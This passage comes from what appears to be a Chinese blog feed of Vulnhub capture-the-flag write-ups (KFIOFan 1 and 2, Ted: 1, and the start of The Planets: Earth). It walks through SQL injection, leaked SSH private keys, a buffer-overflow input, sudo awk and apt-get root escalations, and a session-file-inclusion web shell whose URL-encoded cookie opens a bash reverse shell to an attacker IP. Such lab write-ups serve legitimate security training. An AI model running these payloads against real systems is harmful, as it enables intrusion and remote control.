class="line">g7GZze0h5zIvmuGn6HrI3QKBgQC92vK/NjBcG5MQb55gqd733vsZtGLO7FEjxQQc</span><br><span class="line">qjYIYO6189Dw74Hb6m2ZlVCGvCgh3Ezn5na69Iv3dQI0bCQ4x413Ud03Vqm6bcoh</span><br><span class="line">B4XEHiwaZ//f+ohOAaxENX/ddZjdbA/ZyotZ9qVt6ejdcRi9W0ybkBy0/UuJosXx</span><br><span class="line">kM6enQKBgGpnoOsRUZsihmUKJxGGxpyjEBhSRIZgW591+cEbay9UxEtG1jNEVZfv</span><br><span class="line">InHog1QZohbFl9qvUrstoPdLo2LZ/zMWakPL2rmOTTnkheUyNJQfsvzYpQ6qlQIR</span><br><span class="line">6Vpt+hg6fMysecxEhX8/4RVsAj1zRKFp+NkNmY+/6mACjxxI1nCw</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>同时发现了有以下用户，上边那个私钥应该是 bob 的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:105:110::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">bob:x:1000:1000:Bob,,,:/home/bob:/bin/bash</span><br><span class="line">ftp:x:107:112:ftp daemon,,,:/srv/ftp:/bin/false</span><br><span class="line">vboxadd:x:999:1::/var/run/vboxadd:/bin/false</span><br></pre></td></tr></table></figure><p>成功连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 1</span><br><span class="line">ssh bob@192.168.234.149 -p 26922 -i 1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250505190716.png"></p><p>用户目录下有个 test，这种应该是为提权做准备的，</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215744409.png" alt="image-20250505215744409"></p><p>执行需要输入密码，传出来分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp test root@192.168.234.129:/root/test/Vulnhub</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250505202936.png"></p><p>需要一个密码，但是后续没有什么操作，应该是打缓冲区溢出，最后在 <code>/root</code> 目录下拿到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print (&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6&quot;+&quot;\x20\x48\x55\x55\x55\x55&quot;)&#x27;</span> | ./test</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">ssh bob@192.168.234.149 -p 26922 -i 1</span><br><span class="line"><span class="built_in">sudo</span> su</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215801932.png" alt="image-20250505215801932"></p><blockquote><p>Bravo à toi pour avoir vaincu le serveur de Bob, ce n’était pas si simple et tu y es parvenu !<br>Reprend des forces et à bientôt peut-être pour un CTF KFIOFan 3 ! ;)<br>祝贺您击败了鲍勃的服务器，这并不容易，但您做到了！<br>恢复体力，也许很快就会在 KFIOFan 3 CTF 上见到你！ ;)</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF KFIOFan: 1</title>
      <link href="/articles/78dd4223.html"/>
      <url>/articles/78dd4223.html</url>
      
        <content type="html"><![CDATA[<h2 id="CTF-KFIOFan-1"><a href="#CTF-KFIOFan-1" class="headerlink" title="CTF KFIOFan: 1"></a>CTF KFIOFan: 1</h2><blockquote><p><a href="https://www.vulnhub.com/entry/ctf-kfiofan-1,260/">靶机地址</a></p></blockquote><p>扫出来一个 80 端口</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503163122470.png" alt="image-20250503163122470"></p><p>访问网站需要 basic 认证，但好消息是，点击取消以后有回显，回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Laisse moi deviner Bob, tu as encore perdu ton mot de passe ? LOL</span><br><span class="line">让我猜猜，鲍勃，你又忘记密码了？哈哈</span><br></pre></td></tr></table></figure><blockquote><p>注意：这个靶机用的语言是法语，不是英语</p></blockquote><p>那么猜测用户名是 <code>Bob</code> ，准备爆破密码的时候发现返回包有一个特别的字段，应该和密码有关</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503163145934.png" alt="image-20250503163145934"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WWW-Authenticate: Basic realm=&quot;47.883333 -0.816667&quot;</span><br></pre></td></tr></table></figure><p>通过经纬度搜到一个地名——珀通（<code>Peuton</code>），然后成功通过 <code>Bob:Peuton</code> 登录进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250502220337.png"></p><blockquote><p>这里每次重启之后，经纬度都会变化，然后需要找到对应的法语地名（直接更改 Google 语言设置就好）</p></blockquote><p>dirsearch 扫出来一个 <code>robots.txt</code> 一个 <code>README.md</code> 一个 <code>db</code> </p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503164332735.png" alt="image-20250503164332735"></p><p>在 <code>robots.txt</code> 里拿到了第一个 flag，而 <code>db</code> 和 <code>README.md</code> 没什么用</p><blockquote><p>FLAG 1 : Bravo tu as trouvé le premier flag ! (Oui je sais tu espérais un indice mais au moins tu as les bons reflexes !)<br>旗帜 1：恭喜，您找到了第一面旗帜！ （是的，我知道您希望得到线索，但至少您的反应正确！）</p></blockquote><p>然后发现在 <code>khaosearch.php</code> 界面的 <code>recherche</code> 参数存在 SQL 注入</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250502234052.png"></p><p>然后查出当前数据库是 <code>blog</code> ，数据库用户是 <code>user_blog</code>，数据库版本是 <code>10.1.26-MariaDB-0+deb9u1</code> ，数据库数据存放路径是 <code>/var/lib/mysql/</code> ，表名如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dc_blog</span><br><span class="line">dc_category</span><br><span class="line">dc_comment</span><br><span class="line">dc_link</span><br><span class="line">dc_log</span><br><span class="line">dc_media</span><br><span class="line">dc_meta</span><br><span class="line">dc_permissions</span><br><span class="line">dc_ping</span><br><span class="line">dc_post</span><br><span class="line">dc_post_media</span><br><span class="line">dc_pref</span><br><span class="line">dc_session</span><br><span class="line">dc_setting</span><br><span class="line">dc_spamrule</span><br><span class="line">dc_user</span><br><span class="line">dc_version</span><br><span class="line">ssh_keys</span><br><span class="line">videos</span><br></pre></td></tr></table></figure><p>Flag 2 在 <code>dc_post</code> 表中的 <code>post_content_xhtml</code> 字段</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503164349134.png" alt="image-20250503164349134"></p><blockquote><p>FLAG 2 : Et oui, il faut toujours ben étudier les pages. Même si ça peut paraitre fastidieux !<br>旗帜 2：是的，您必须始终仔细研究这些页面。即使它看起来很乏味！</p></blockquote><p>然后拿到了 alice 的私钥</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250503003012.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpQIBAAKCAQEAylRXBOzEZAAw/8cHjJaM+0HQYCxXr6xCD1A3WxcWtOobtLWu</span><br><span class="line">ZNLtcQGLH3hIlgi1bljnomhUXQJlnd71O/7iTJ/YBx2M9oA1vVo4xQBtZT8PdCxR</span><br><span class="line">0qvbjpZvCcgSTgZI5mqjppB0ypu11yUzg4NZAv31TcG6p8fnomeQlC0k0VLY5rJW</span><br><span class="line">8XzTKcmkyDKUE1DuFEVypiJYnPgtdjzcq9wz/IU/VQ2k+GZSO+LGn/Mm22rerNnr</span><br><span class="line">1DFDCXc1gkDoWdaYvU9F4UAsgO/fVZCplOVdhd/L8PvkmIvtUlrhCnuaas0HboRt</span><br><span class="line">b06e25DkSDHS9jrANJPXhobPg8RLVLgBsYUHwQIDAQABAoIBAQC2oTJ7C4yqB1Iz</span><br><span class="line">TmAOEsbm9R018lCkDYUDdZDB9DFW1Ap2L5hfAdW5r374xQYgB3RdSnqrKikcW1GG</span><br><span class="line">Ev6hTQzPxWil45Kd3lSjupCLojscrLMyVd71npLsPfW0ipebPikHczKM4s/JIowc</span><br><span class="line">y0OYbjMmdD28FiZ51APNoFXsqmMVXWvXeCa28MPQTR7tVWdPv8f0CfGODCMepUdL</span><br><span class="line">nJulkOmx2zh24/yOBAbJ823SLtuHqutT3BTMI8Dmes8vIQOm5EQnyXn0ch7GnVkK</span><br><span class="line">cwQVQtE6cfl6NEpctkYmGY9SDurFH8pLtjaEUW7urF1Tmftt1aw5os7gruEzuYEv</span><br><span class="line">GA7MONqRAoGBAOktgZmDIei1ql+Qrnk65W2euePjHQ+DMk/rsiNJqdJbsa+UoBnn</span><br><span class="line">/AbobCgjlH53BcPvWvafiFBnJ0B4DjLVQEWr3dQTpmXP6W2SsYYXD0O+CEreDxsY</span><br><span class="line">FTHNFuy1v6yx4/T0QLWe2hE9GPxspnHOBWPLVVQOXcOB9rUZeA3/771TAoGBAN4h</span><br><span class="line">5kv79FvHU/uwokGh6gXna6XsPwKIS+yY4AgnGPS3z3LwPJM+QACFL5REDo5mEDyw</span><br><span class="line">09Oj7WM+ia3r2j35bmBy25DMHJeoF7RAHERln8m3Nc9vrrXeJMYYcA34ECgBZPI7</span><br><span class="line">HWanPXDdysCL3mc71VmTQpi2Dcrkan/hpaQVQbAbAoGBALEdc7ebN4J/mu4EA8Lp</span><br><span class="line">zaM6UZCbzlMeIHU8Xo8XQPsb0xe/GO0UnQbSPHUwsXZuCd8OTFXQT8Zi1BnQF1jd</span><br><span class="line">SnihV1njoxzqlDA6oMVtdpbKHZpgmbDG1jKBycv7MaCHbtN9RDmwc4tskTILhVIk</span><br><span class="line">X0uyAxpZ3zbF3RMqSVq48O0pAoGAZFgB9Y8ymocXrBnloipnUhVxbnmjGRzC13VT</span><br><span class="line">trsaremev7hAVO+I7/M6RAreXHtEmHX0qqVhpjRo83UYmGhl8RHRl75sqCGZ26Ye</span><br><span class="line">XtNddDzcBQHZdXSNPiNp8xV9DuVaWYZUyLuBqMu4PHSymgXQYe+A5QVQg7fdWDlx</span><br><span class="line">nwavLsMCgYEAxRhr6WXziigYvxTzU8VwizJ1e79ww0LHd9vKtVljX7+1z/GCdiJt</span><br><span class="line">rv/Offi1RTQXmKbX1tSSaZMJRfotCfWpwyWda3y4Lo3GSxflZszBWSuS80N4Y4Nx</span><br><span class="line">3q+yELsSgqzMXhzo5vZeqTr/+7jKHWIMDoUZwO47wnDdLRJfpBb1d+g=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><blockquote><p>每次重启之后alice 的私钥也会变化</p></blockquote><p>将私钥写入文件 <code>1</code> ，然后设置权限并 ssh 连接，然后在当前目录下拿到 flag3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 1</span><br><span class="line">ssh -i 1 alice@192.168.234.147</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag3.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250503011925.png"></p><blockquote><p>FLAG 3 : Bravo pour être arrivé jusqu’ici. Cela montre que tu maitrises très bien les notions essentielles ! Un dernier petit effort et le root est à toi !<br>旗帜 3：恭喜您取得如此大的进步。这表明您已经很好地掌握了基本概念！只需最后一点努力，根就属于你了！</p></blockquote><p>信息搜集准备提权，这里直接使用 awk 提权，最后在 <code>/root</code> 目录下找到最后一个 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br><span class="line"><span class="built_in">cat</span> ~/flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503164407048.png" alt="image-20250503164407048"></p><blockquote><p>FLAG 4 : TERMINE ! Un grand bravo à toi pour être arrivé jusqu’ici : la machine est à toi, sa survie ou sa destruction repose désormais entièrement sur ton éthique. Bonne continuation Hacker !<br>旗帜 4：完成！祝贺您取得了如此大的成就：这台机器是您的，它的生存或毁灭现在完全取决于您的道德。祝黑客好运！</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ted: 1</title>
      <link href="/articles/2eed37f5.html"/>
      <url>/articles/2eed37f5.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ted-1"><a href="#Ted-1" class="headerlink" title="Ted: 1"></a>Ted: 1</h2><blockquote><p><a href="https://www.vulnhub.com/entry/ted-1,327/">靶机地址</a></p></blockquote><p>Nmap 扫描了一下只开了一个 80 端口</p><p>![](<a href="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted">https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted</a> image 20250430130735.png)</p><p>那就用 dirsearch 扫一下网站，没扫出来东西，只有一个登录界面，尝试登录提示 hash 不对</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503014046290.png"></p><p>尝试了一下其他的，回显不一样，密码应该就是 admin</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503014523247.png" alt="image-20250503014523247"></p><p>最后发现是 sha256 记得要是大写的</p><blockquote><p><code>admin/8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918</code></p></blockquote><p>![](<a href="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted">https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted</a> image 20250430182149.png)</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503014534329.png" alt="image-20250503014534329"></p><p>是一个简单文件服务器，搜一下 <code>/etc/passwd</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/bash</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/false</span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">whoopsie:x:109:116::/nonexistent:/bin/false</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br><span class="line">ted:x:1000:1000:Ted,,,:/home/ted:/bin/bash</span><br><span class="line">mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false</span><br></pre></td></tr></table></figure><p>本来以为是读文件，然后回显文件内容的文件服务器，结果是 php 文件包含，那就简单了</p><p>![](<a href="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted">https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted</a> image 20250430174321.png)</p><p>但试了下伪协议和远程文件包含，不行。开启了 session，那就试试 session 文件包含（为什么不用日志包含，因为找不到日志的位置，有可能没有权限或者是压根没开日志），试了下 session 文件存放路径在 <code>/var/lib/php/sessions/</code>，还好这是个好人，然后看到 <code>user_pref</code> 字段也在里边，那更好了，应该不用条件竞争了</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250503014046290.png" alt="image-20250503014046290"></p><p>Ok 成功写马，直接反弹 shell</p><p>![](<a href="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted">https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted</a> image 20250430175826.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=[SessionID]; user_pref=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%22%62%61%73%68%20%2d%69%20%3e%26%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%33%34%2e%31%32%39%2f%39%30%39%39%20%30%3e%26%31%22%29%3b%3f%3e</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.234.129/9099 0&gt;&amp;1</span><br><span class="line">search=/var/lib/php/sessions/sess_[SessionID]</span><br></pre></td></tr></table></figure><p>![](<a href="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted">https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted</a> image 20250430215610.png)</p><p>然后使用下边的命令通过 apt-get 提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update -o APT::Update::Pre-Invoke::=/bin/bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Planets: Earth</title>
      <link href="/articles/5b85ed80.html"/>
      <url>/articles/5b85ed80.html</url>
      
        <content type="html"><![CDATA[<h2 id="The-Planets-Earth"><a href="#The-Planets-Earth" class="headerlink" title="The Planets: Earth"></a>The Planets: Earth</h2><blockquote><p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">靶机地址</a></p></blockquote><p>探测出来 IP 是 <code>192.168.234.144</code> 起了一个 http 和 https</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151031661.png" alt="image-20250502151031661"></p><p>扫出来两个域名：<code>earth.local</code>、<code>terratest.earth.local</code></p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151037923.png" alt="image-20250502151037923"></p><p>改一下配置文件，Windows 的是 <code>C:\Windows\System32\drivers\etc\hosts</code>，Linux 的是 <code>/etc/hosts</code>。</p><p>注意，如果挂了梯子的，如果打不开<code>https://earth.local/</code>可能需要关闭梯子或者是改一下 DNS</p><p>扫出来几个目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://earth.local/admin/</span><br><span class="line">https://earth.local/admin/login</span><br><span class="line">https://terratest.earth.local/index.html</span><br><span class="line">https://terratest.earth.local/robots.txt</span><br></pre></td></tr></table></figure><p>先看 <code>robots.txt</code> </p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151055101.png" alt="image-20250502151055101"></p><p>有一个和其他不一样的东西 <code>Disallow: /testingnotes.*</code> 根据名称盲猜后缀是 txt ，访问一下试试，给了一些提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br><span class="line"></span><br><span class="line">安全消息系统测试笔记：  </span><br><span class="line">* 使用异或加密算法，应与 RSA 中使用的算法一样安全。  </span><br><span class="line">* 地球已确认收到我们发送的消息。  </span><br><span class="line">* 使用 testdata.txt 文件测试加密。  </span><br><span class="line">* terra 作为管理员门户的用户名。  </span><br><span class="line">待办事项：  </span><br><span class="line">* 我们如何安全地向地球发送每月密钥？还是应该每周更换密钥？  </span><br><span class="line">* 需要测试不同密钥长度以防范暴力破解。密钥应该多长？  </span><br><span class="line">* 需要改进消息界面和管理员面板的界面，目前非常基础。</span><br></pre></td></tr></table></figure><p>那就看看 <code>testdata.txt</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure><p>没有什么新东西了，看看另一个域名，首页有一个先前发送的消息，看看能不能解密一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Previous Messages:</span><br><span class="line"></span><br><span class="line">- 